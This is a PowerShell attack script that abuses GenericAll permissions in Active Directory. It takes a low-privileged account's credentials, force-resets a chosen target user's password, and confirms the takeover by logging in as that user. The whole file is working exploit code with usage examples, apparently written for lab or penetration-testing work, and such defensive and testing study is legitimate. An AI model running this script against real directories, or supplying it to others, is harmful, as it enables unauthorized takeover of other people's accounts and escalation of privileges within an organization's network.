<#
.SYNOPSIS
Abuses GenericAll rights to reset an AD user's password using a low-privileged user.

.DESCRIPTION
This script uses GenericAll permissions to reset a target user's password.
It can run using a low-privileged account that has ACL rights over the target.
Supports specifying a different domain.

.PARAMETER TargetUser
SamAccountName of the target user (e.g., "targetguy").

.PARAMETER NewPassword
New password to assign to the target user.

.PARAMETER LowPrivUser
SamAccountName of the low-privileged user that has GenericAll permissions.

.PARAMETER LowPrivPassword
Password for the LowPrivUser.

.PARAMETER Domain
(Optional) Domain name. If omitted, script uses current domain automatically.

.EXAMPLE
.\acl.ps1 -TargetUser targetguy -NewPassword newpassword123 -LowPrivUser lowprivguy -LowPrivPassword p@ssw0rd123!

.EXAMPLE
.\acl.ps1 -TargetUser targetguy -NewPassword newpassword123 -LowPrivUser lowprivguy -LowPrivPassword p@ssw0rd123! -Domain LAB
#>

param(
	[Parameter(Mandatory=$true)][string]$TargetUser,
	[Parameter(Mandatory=$true)][string]$NewPassword,
	[Parameter(Mandatory=$true)][string]$LowPrivUser,
	[Parameter(Mandatory=$true)][string]$LowPrivPassword,
	[Parameter(Mandatory=$false)][string]$Domain
)

function Write-Ok
{ param([string]$m) Write-Host "[+] $m" -ForegroundColor Green 
}
function Write-Bad
{ param([string]$m) Write-Host "[-] $m" -ForegroundColor Red 
}
function Write-Info
{ param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
}

# --- AD module check ---
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Bad "ActiveDirectory module not found. Install RSAT."
	exit 1
}
Import-Module ActiveDirectory

# --- Determine domain ---
if (-not $Domain)
{
	$Domain = (Get-ADDomain).NetBIOSName
	Write-Info "Using current domain: $Domain"
} else
{
	Write-Info "Using specified domain: $Domain"
}

# --- Create low-priv credentials ---
$SecurePass = ConvertTo-SecureString $LowPrivPassword -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential ("$Domain\$LowPrivUser", $SecurePass)

# --- Ensure target exists ---
try
{
	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop -Credential $Creds
	Write-Info "Target user '$TargetUser' found."
} catch
{
	Write-Bad "Target user '$TargetUser' not found or no permission to access."
	exit 1
}

# --- Reset password ---
Write-Info "Resetting password for '$TargetUser'..."
try
{
	Set-ADAccountPassword -Identity $TargetUser -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset -Credential $Creds -ErrorAction Stop
	Write-Ok "Password reset to '$NewPassword'"
} catch
{
	Write-Bad "Password reset failed: $($_.Exception.Message)"
	exit 1
}

# --- Validate new password ---
try
{
	$ValidationCreds = New-Object System.Management.Automation.PSCredential ("$Domain\$TargetUser", (ConvertTo-SecureString $NewPassword -AsPlainText -Force))
	$null = Get-ADUser -Identity $TargetUser -Credential $ValidationCreds -ErrorAction Stop
	Write-Ok "Validation success: authenticated as '$TargetUser' with new password."
	exit 0
} catch
{
	Write-Bad "Validation failed: $($_.Exception.Message)"
	exit 1
}
